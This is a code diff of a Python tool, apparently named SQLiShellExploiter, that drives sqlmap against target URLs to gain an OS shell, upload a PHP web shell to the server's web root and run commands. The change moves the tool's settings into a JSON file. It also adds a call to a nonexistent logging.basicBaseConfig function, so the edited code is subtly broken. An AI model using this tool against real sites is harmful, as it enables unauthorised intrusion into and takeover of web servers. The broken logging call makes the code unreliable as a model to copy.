@@ -7,10 +7,13 @@ from typing import List, Dict, Optional
 from urllib.parse import urlparse
 import requests
 from colorama import init, Fore, Style
-import config.setting as setting
 from settings import TARGET_FILE_PATH, TARGET, TARGET_FILE_CHECK # type: ignore
 
 init(autoreset=True)
+
+# setting.json dosyasını oku
+with open(os.path.join(os.path.dirname(__file__), 'config', 'setting.json'), 'r', encoding='utf-8') as f:
+    setting = json.load(f)
 
 # Directory and file paths
 SCAN_RESULTS_DIR = "scan_results"
@@ -23,7 +26,7 @@ OUTPUT_DIR = "sql_exploits"
 if not os.path.exists(LOG_DIR):
     os.makedirs(LOG_DIR)
 
-logging.basicConfig(
+logging.basicBaseConfig(
     filename=LOG_FILE,
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
@@ -32,8 +35,11 @@ logging.basicConfig(
 class SQLiShellExploiter:
     def __init__(self):
         self.sqlmap_base_args = [
-            "sqlmap", "-v3", "--batch", "--threads=10",
-            "--output-dir", OUTPUT_DIR, "--level=3", "--risk=3",
+            "sqlmap", "-v3", "--batch", 
+            f"--threads={setting.get('sqlmap_threads', 10)}",
+            "--output-dir", OUTPUT_DIR, 
+            f"--level={setting.get('sqlmap_level', 3)}", 
+            f"--risk={setting.get('sqlmap_risk', 3)}",
             "--tamper=space2comment,randomcase"
         ]
         self.exploit_methods = [
@@ -53,7 +59,7 @@ class SQLiShellExploiter:
                 args,
                 capture_output=True,
                 text=True,
-                timeout=300
+                timeout=setting.get('sqlmap_timeout', 300)
             )
             if "is vulnerable" in result.stdout.lower() or "confirmed" in result.stdout.lower():
                 logging.info(f"SQLmap confirmed vulnerability for {url}")
@@ -80,7 +86,7 @@ class SQLiShellExploiter:
                 args,
                 capture_output=True,
                 text=True,
-                timeout=300
+                timeout=setting.get('sqlmap_timeout', 300)
             )
             if "web application OS shell" in result.stdout.lower():
                 logging.info(f"OS shell successful for {url}")
@@ -114,7 +120,7 @@ if(isset($_REQUEST['cmd'])){
             args = self.sqlmap_base_args + [
                 "-u", url,
                 "--file-write", shell_path,
-                "--file-dest", "/var/www/html/shell.php"
+                "--file-dest", setting.get('shell_upload_path', "/var/www/html/shell.php")
             ]
             if vuln_info and 'parameter' in vuln_info:
                 args.extend(["-p", vuln_info['parameter']])
@@ -123,13 +129,13 @@ if(isset($_REQUEST['cmd'])){
                 args,
                 capture_output=True,
                 text=True,
-                timeout=300
+                timeout=setting.get('sqlmap_timeout', 300)
             )
             if "file uploaded successfully" in result.stdout.lower():
                 parsed = urlparse(url)
                 shell_url = f"{parsed.scheme}://{parsed.netloc}/shell.php"
                 try:
-                    response = requests.get(shell_url, timeout=10)
+                    response = requests.get(shell_url, timeout=setting.get('request_timeout', 10))
                     if response.status_code == 200:
                         logging.info(f"File upload successful for {url} - Shell at {shell_url}")
                         print(f"{Fore.GREEN}[+] Shell uploaded to {shell_url}{Style.RESET_ALL}")
@@ -151,7 +157,7 @@ if(isset($_REQUEST['cmd'])){
     def try_command_execution(self, url: str, vuln_info: Optional[Dict] = None) -> bool:
         """Attempt direct command execution."""
         try:
-            args = self.sqlmap_base_args + ["-u", url, "--os-cmd", "whoami"]
+            args = self.sqlmap_base_args + ["-u", url, "--os-cmd", setting.get('test_command', "whoami")]
             if vuln_info and 'parameter' in vuln_info:
                 args.extend(["-p", vuln_info['parameter']])
                 
@@ -159,7 +165,7 @@ if(isset($_REQUEST['cmd'])){
                 args,
                 capture_output=True,
                 text=True,
-                timeout=300
+                timeout=setting.get('sqlmap_timeout', 300)
             )
             if "command output" in result.stdout.lower():
                 logging.info(f"Command execution successful for {url}")
@@ -176,10 +182,10 @@ if(isset($_REQUEST['cmd'])){
             return False
 
     def load_vulnerable_urls(self) -> List[Dict]:
-        """Load URLs from settings.py based on TARGET_FILE_CHECK."""
+        """Load URLs from setting.json based on TARGET_FILE_CHECK."""
         vulnerable_urls = []
         
-        if TARGET_FILE_CHECK.lower() == "on":
+        if setting.get('TARGET_FILE_CHECK', 'off').lower() == "on":
             if not os.path.exists(TARGET_FILE_PATH):
                 logging.error(f"Target file not found: {TARGET_FILE_PATH}")
                 print(f"{Fore.RED}[-] Target file not found: {TARGET_FILE_PATH}{Style.RESET_ALL}")
@@ -197,13 +203,13 @@ if(isset($_REQUEST['cmd'])){
                 logging.error(f"Error loading {TARGET_FILE_PATH}: {str(e)}")
                 print(f"{Fore.RED}[-] Error loading {TARGET_FILE_PATH}: {str(e)}{Style.RESET_ALL}")
         else:
-            if not TARGET:
-                logging.error("No target specified in settings.TARGET")
-                print(f"{Fore.RED}[-] No target specified in settings.TARGET{Style.RESET_ALL}")
+            if not setting.get('TARGET'):
+                logging.error("No target specified in setting.json")
+                print(f"{Fore.RED}[-] No target specified in setting.json{Style.RESET_ALL}")
                 return []
-            vulnerable_urls.append({'url': TARGET, 'db_type': 'Unknown', 'parameter': None})
-            logging.info(f"Loaded single URL from settings.TARGET: {TARGET}")
-            print(f"{Fore.CYAN}[*] Loaded target URL: {TARGET}{Style.RESET_ALL}")
+            vulnerable_urls.append({'url': setting.get('TARGET'), 'db_type': 'Unknown', 'parameter': None})
+            logging.info(f"Loaded single URL from setting.json: {setting.get('TARGET')}")
+            print(f"{Fore.CYAN}[*] Loaded target URL: {setting.get('TARGET')}{Style.RESET_ALL}")
         
         return vulnerable_urls
 
